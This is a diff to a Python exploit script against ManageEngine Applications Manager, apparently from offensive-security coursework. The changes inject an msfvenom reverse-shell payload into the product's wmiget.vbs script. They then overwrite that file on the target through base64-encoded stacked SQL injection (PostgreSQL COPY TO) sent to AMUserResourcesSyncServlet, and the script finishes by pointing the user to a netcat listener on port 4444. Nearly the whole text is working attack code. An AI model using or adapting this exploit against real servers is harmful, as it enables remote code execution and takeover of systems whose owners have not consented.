@@ -1,6 +1,8 @@
 import sys, re, os
+import base64
 import requests
 from bs4 import BeautifulSoup
+import urllib.parse
 
 def generate_shell(filename, LPORT):
 	print("Generating MSF Venom Payload......")
@@ -19,12 +21,24 @@ def generate_shell(filename, LPORT):
 	while re.findall(r'::', shellcode):
 		shellcode = re.sub(r'::', ':', shellcode)
 
-	with open("shell2.vbs", "w") as f:
-		f.write(shellcode)
+	# Inject shellcode into wmiget.vbs
+	with open("wmiget.vbs", "r") as f:
+		script = f.read()
+	script = re.sub(r'::(?=WScript.Quit\(0\))', f':{shellcode}:', script)
+	while re.findall(r'::', script):
+		script = re.sub(r'::', ':', script)
+
+	with open("wmiget_shell.vbs", "w") as f:
+		f.write(script)
+
+	return script
 
 def write_to_file(ip, content, filePath):
-
 	print(f"Writing contents into {filePath}......")
+
+	content_base64 = base64.b64encode(content.encode('ascii')).decode('ascii')
+	content_encoded = urllib.parse.quote(content_base64)
+
 	s = requests.Session()
 
 	headers = {
@@ -33,17 +47,23 @@ def write_to_file(ip, content, filePath):
 	}
 	s.headers.update(headers)
 
-	proxies = {
-		'http': 'http://127.0.0.1:8080'
+	# proxies = {
+	# 	'http': 'http://127.0.0.1:8080',
+	# 	'https': 'http://127.0.0.1:8080'
+	# }
+	# s.proxies.update(proxies)
+
+	userId = f"1;COPY+(SELECT+convert_from(decode($${content_encoded}$$,$$base64$$),$$utf-8$$))+TO+$${filePath}$$;--+"
+	target = f"https://{ip}:8443/servlet/AMUserResourcesSyncServlet"
+	
+	# If use raw data, must specify x-www-form-urlencoded header
+	data = f"ForMasRange=1&userId={userId}"
+	headers = {
+		'Content-Type': 'application/x-www-form-urlencoded'
 	}
-	s.proxies.update(proxies)
 
-	userId = f"1;COPY+(SELECT+$${content}$$)+TO+$${filePath}$$;--+"
-	target = f"https://{ip}:8443/servlet/AMUserResourcesSyncServlet?" + \
-		f"ForMasRange=1&userId={userId}"
-	print(target)
-
-	r = s.get(target, verify = False)
+	r = s.post(target,data=data,headers=headers,verify=False)
+	print(r)
 
 def main():
 	if len(sys.argv) != 2:
@@ -53,9 +73,12 @@ def main():
 
 	ip = sys.argv[1]
 
-	generate_shell(filename = "shell.vbs", LPORT = 4444)
+	shell = generate_shell(filename = "shell.vbs", LPORT = 4444)
 
-	# write_to_file(ip, "awae", "C:\\Users\\Public\\offsec.txt")
+	filepath = "C:\\Program Files (x86)\\ManageEngine\\AppManager12\\working\\conf\\application\\scripts\\wmiget.vbs"
+	write_to_file(ip, shell, filepath)
+
+	print("Shellcode written, ensure netcat listener listening on port 4444")
 
 if __name__ == '__main__':
 	main()
